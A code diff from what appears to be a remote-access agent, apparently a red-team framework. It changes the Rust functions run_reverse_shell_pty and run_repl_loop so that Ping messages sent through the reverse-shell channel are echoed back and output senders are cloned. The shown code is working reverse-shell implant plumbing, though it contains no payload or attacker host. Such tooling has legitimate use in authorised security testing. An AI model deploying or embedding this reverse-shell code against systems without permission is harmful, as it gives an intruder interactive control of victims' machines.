@@ -103,6 +103,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
     // Spawn task to send PTY output
     const CHUNK_SIZE: usize = 1024;
+    let output_tx_clone = output_tx.clone();
     tokio::spawn(async move {
         loop {
             let mut buffer = [0; CHUNK_SIZE];
@@ -131,7 +132,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
                 continue;
             }
 
-            if let Err(_err) = output_tx
+            if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
                     kind: ReverseShellMessageKind::Data.into(),
                     data: buffer[..n].to_vec(),
@@ -145,7 +146,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             }
 
             // Ping to flush
-            if let Err(_err) = output_tx
+            if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: Vec::new(),
@@ -176,6 +177,17 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
         if let Some(msg) = input_rx.recv().await {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
+                if let Err(_err) = output_tx
+                    .send(ReverseShellRequest {
+                        kind: ReverseShellMessageKind::Ping.into(),
+                        data: msg.data,
+                        task_id,
+                    })
+                    .await
+                {
+                    #[cfg(debug_assertions)]
+                    log::error!("reverse_shell_pty ping echo failed: {_err}");
+                }
                 continue;
             }
             if let Err(_err) = writer.write_all(&msg.data) {
@@ -249,7 +261,7 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
             .with_task_context(Arc::new(agent), task_id, Vec::new());
         let mut repl = Repl::new();
         let stdout = VtWriter {
-            tx: output_tx,
+            tx: output_tx.clone(),
             task_id,
         };
         let mut stdout = BufWriter::new(stdout);
@@ -261,6 +273,11 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
 
         while let Some(msg) = input_rx.blocking_recv() {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
+                let _ = output_tx.blocking_send(ReverseShellRequest {
+                    kind: ReverseShellMessageKind::Ping.into(),
+                    data: msg.data,
+                    task_id,
+                });
                 continue;
             }
             if msg.data.is_empty() {
